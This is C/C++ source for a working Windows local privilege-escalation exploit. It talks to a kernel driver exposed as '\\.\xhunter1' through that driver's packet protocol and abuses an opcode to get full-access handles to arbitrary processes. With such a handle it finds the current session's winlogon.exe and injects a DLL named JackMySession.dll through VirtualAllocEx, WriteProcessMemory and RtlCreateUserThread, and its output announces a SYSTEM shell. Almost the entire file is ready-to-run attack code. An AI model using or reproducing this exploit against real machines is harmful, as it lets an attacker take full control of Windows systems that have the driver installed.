#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS

#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include <stdint.h>
#include <Psapi.h>
#include <time.h>

typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	ULONG ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);
static _NtQueryInformationProcess NtQIP = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");

typedef NTSTATUS(WINAPI * _RtlCreateUserThread)(IN HANDLE               ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN              CreateSuspended,
	IN ULONG                StackZeroBits,
	IN OUT PULONG           StackReserved,
	IN OUT PULONG           StackCommit,
	IN PVOID                StartAddress,
	IN PVOID                StartParameter OPTIONAL,
	OUT PHANDLE             ThreadHandle,
	OUT PVOID          ClientID);

static _RtlCreateUserThread RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserThread");

typedef struct _PROCESS_SESSION_INFORMATION {
	ULONG SessionId;
} PROCESS_SESSION_INFORMATION, *PPROCESS_SESSION_INFORMATION;

#define ProcessSessionInformation 24

#pragma pack(push, 1)
struct xhunter1_common_hdr
{
	uint32_t pkt_size;
	uint32_t pkt_magic;
	uint32_t pkt_req_id;
};

struct xhunter1_req_hdr
{
	xhunter1_common_hdr common_hdr;
	uint32_t pkt_opcode;
	uint64_t pkt_res_buf;
};

struct xhunter1_req
{
	xhunter1_req_hdr hdr;
	char body[0x270 - sizeof(hdr)];
};

struct xhunter1_res
{
	xhunter1_common_hdr hdr;
	char body[0x2FA - sizeof(hdr)];
};

// Packet ID 785.
struct xhunter1_proc_handle_req
{
	DWORD dwProcessId;
	DWORD dwDesiredAccess;
};

struct xhunter1_proc_handle_res
{
	DWORD dwStatus;
	HANDLE hProc;
};

#pragma pack(pop)

xhunter1_req* build_xhunter1_packet(uint32_t opcode, char* body, size_t body_len)
{
	if (body_len > (sizeof(((xhunter1_req*)NULL)->body))) {
		return NULL;
	}

	xhunter1_req* req = new xhunter1_req();
	memset(req, 0, sizeof(xhunter1_req));
	req->hdr.common_hdr.pkt_size = 0x270;
	req->hdr.common_hdr.pkt_magic = 0x345821AB;
	req->hdr.common_hdr.pkt_req_id = rand();
	req->hdr.pkt_opcode = opcode;

	if (body != NULL) {
		memcpy(req->body, body, body_len);
	}

	return req;
}

xhunter1_res* send_xhunter1_packet(HANDLE hDriver, xhunter1_req* req)
{
	DWORD dwBytesWritten = 0;
	xhunter1_res* res = new xhunter1_res();
	memset(res, 0, sizeof(xhunter1_res));

	// This isn't optimal, but we need to keep the header size the same across both x86 and x86_64.
	req->hdr.pkt_res_buf = (uint64_t)res;

	if (!WriteFile(hDriver, req, sizeof(xhunter1_req), &dwBytesWritten, NULL)) {
		return NULL;
	}

	// The driver returns the response length as dwBytesWritten for some reason...
	if (dwBytesWritten != sizeof(xhunter1_res)) {
		return NULL;
	}

	// Response packets have their own magic value.
	if (res->hdr.pkt_magic != 0x12121212) {
		return NULL;
	}

	// The response buffer's "request ID" should be the bit-wise NOT'ed version of our request's ID.
	if (~res->hdr.pkt_req_id != req->hdr.common_hdr.pkt_req_id) {
		return NULL;
	}

	free(req);
	return res;
}

HANDLE get_xhunter1_handle()
{
	return CreateFileW(L"\\\\.\\xhunter1", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

HANDLE get_proc_handle(HANDLE hDriver, DWORD dwProcessId, DWORD dwDesiredAccess)
{
	// Helper function that gets us a process handle to any PID we specify with the access we desire.
	xhunter1_proc_handle_req handle_req = { 0 };
	handle_req.dwProcessId = dwProcessId;
	handle_req.dwDesiredAccess = dwDesiredAccess;
	xhunter1_req* req_packet = build_xhunter1_packet(785, (char*)&handle_req, sizeof(xhunter1_proc_handle_req));
	xhunter1_res* res_packet = send_xhunter1_packet(hDriver, req_packet);
	
	HANDLE hProc = INVALID_HANDLE_VALUE;

	if (res_packet != NULL) {
		xhunter1_proc_handle_res* handle_res = (xhunter1_proc_handle_res*)&res_packet->body;
		if (handle_res->dwStatus == STATUS_SUCCESS) {
			hProc = handle_res->hProc;
		} else {
			SetLastError(handle_res->dwStatus);
		}

		free(res_packet);
	}

	return hProc;
}

HANDLE get_own_winlogon_handle(HANDLE hDriver)
{
	DWORD own_pid = GetCurrentProcessId();
	DWORD own_sid = 0;

	if (!ProcessIdToSessionId(own_pid, &own_sid)) {
		printf("[-] Failed to get our own session ID? GetLastError() = %lu\n", GetLastError());
		return INVALID_HANDLE_VALUE;
	}

	int pid = 0;
	while (true) {
		wchar_t file_path[MAX_PATH + 1] = { 0 };
		HANDLE hProc = get_proc_handle(hDriver, pid, PROCESS_ALL_ACCESS);

		if (hProc == INVALID_HANDLE_VALUE) {
			SetLastError(0);
			goto cleanup;
		}

		if (!GetModuleFileNameExW(hProc, NULL, (LPWSTR)&file_path, MAX_PATH)) {
			goto cleanup;
		}

		if (wcsstr(file_path, L"winlogon.exe")) {
			// Does this belong to our session? We need to rely on the undocumented ProcessSessionInformation ProcessInformationClass to find out.
			// Simply invoking ProcessIdToSessionId for the winlogon PID won't do, as we don't have access to do that outside of our "god-mode" handle.
			PROCESS_SESSION_INFORMATION psi = { 0 };
			if (NtQIP(hProc, ProcessSessionInformation, &psi, sizeof(PROCESS_SESSION_INFORMATION), NULL) == STATUS_SUCCESS) {
				if (psi.SessionId == own_sid) {
					return hProc;
				}
			}
		}

		cleanup:
		CloseHandle(hProc);
		pid += 4;
	}
	
	return INVALID_HANDLE_VALUE;
}

BOOL inject_to_remote(HANDLE hProc, const wchar_t* path)
{
	size_t path_len = wcslen(path);

	if(path_len > MAX_PATH - 1) {
		return FALSE;
	}

	size_t path_size = (wcslen(path) + 1) * 2;
	// Allocate space for the library path in the remote process
	LPVOID lib_name_addr = VirtualAllocEx(hProc, NULL, path_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lib_name_addr == NULL) {
		printf("[-] VirtualAllocEx() failed. GetLastError() = %lu\n", GetLastError());
		return FALSE;
	}

	// Write library name to segment in remote process memory that we just allocated.
	SIZE_T numBytesWritten = 0;
	if (!WriteProcessMemory(hProc, lib_name_addr, (LPCVOID)path, path_size, &numBytesWritten)) {
		printf("[-] WriteProcessMemory() failed. GetLastError() = %lu\n", GetLastError());
		return FALSE;
	}

	if (numBytesWritten != path_size) {
		printf("[-] Short write in WriteProcessMemory(). GetLastError() = %lu\n", GetLastError());
		return FALSE;
	}

	FARPROC loadlibrary_addr = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
	if (loadlibrary_addr == NULL) {
		printf("[-] Failed to resolve address of LoadLibraryW. GetLastError() = %lu\n", GetLastError());
		return FALSE;
	}

	// Finally, invoke LoadLibraryW in the remote process using RtlCreateUserThread.
	HANDLE hThread = INVALID_HANDLE_VALUE;
	if (RtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, (PVOID)loadlibrary_addr, (PVOID)lib_name_addr, &hThread, NULL) != STATUS_SUCCESS) {
		printf("[-] RtlCreateUserThread() failed. GetLastError() = %lu\n", GetLastError());
		return FALSE;
	}

	return hThread != INVALID_HANDLE_VALUE;
}

int main()
{
	static_assert(sizeof(xhunter1_req) == 0x270, "Request packet size expected to be 0x270 bytes in length!");
	static_assert(sizeof(xhunter1_res) == 0x2FA, "Response packet size expected to be 0x2FA bytes in length!");

	srand((unsigned int)time(NULL));
	HANDLE hDriver = get_xhunter1_handle();
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to get a handle to xhunter1. Is the driver loaded? GetLastError() = %lu\n", GetLastError());
		return 1;
	}

	HANDLE hProc = get_own_winlogon_handle(hDriver);
	if (hProc == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to get a handle to winlogon.exe for current session.\n");
		return 2;
	}

	printf("[*] Got a handle to winlogon.exe for current session.\n");
	
	const wchar_t module_name[] = L"\\JackMySession.dll";
	wchar_t module_path[MAX_PATH + 1] = { 0 };
	DWORD dir_size = GetCurrentDirectoryW(MAX_PATH, (LPWSTR)&module_path);

	if (dir_size == 0) {
		printf("[-] Failed to get current directory. GetLastError() = %lu\n", GetLastError());
		return 3;
	}

	if (dir_size > (MAX_PATH - wcslen(module_name))) {
		printf("[-] Not enough space to form full module path...\n");
		return 4;
	}

	wcscat_s(module_path, module_name);
	if (inject_to_remote(hProc, module_path)) {
		printf("[*] Created remote thread successfully, if all went well you'll be getting a SYSTEM shell shortly...\n");
	}

	getchar();
	return 0;
}